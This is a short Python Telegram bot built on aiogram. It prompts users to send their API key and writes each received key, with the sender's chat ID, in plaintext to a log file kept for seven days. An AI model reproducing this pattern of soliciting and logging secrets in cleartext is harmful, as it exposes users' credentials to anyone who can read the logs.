from aiogram import Bot, Dispatcher, types
from aiogram.types import ParseMode
from aiogram.utils import executor
from loguru import logger
import os

API_TOKEN = os.environ['LH_BOT_TOKEN'] 

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

logger.add("bot_logs.log", rotation="1 day", retention="7 days", level="INFO")

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("Hello! Please send me your API key.")

@dp.message_handler(lambda message: message.text)
async def handle_message(message: types.Message):
    chat_id = message.chat.id
    api_key = message.text

    logger.info(f"Received API key: {api_key} from chat ID: {chat_id}")    
    await message.reply("Thank you! Your API key has been received.")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)



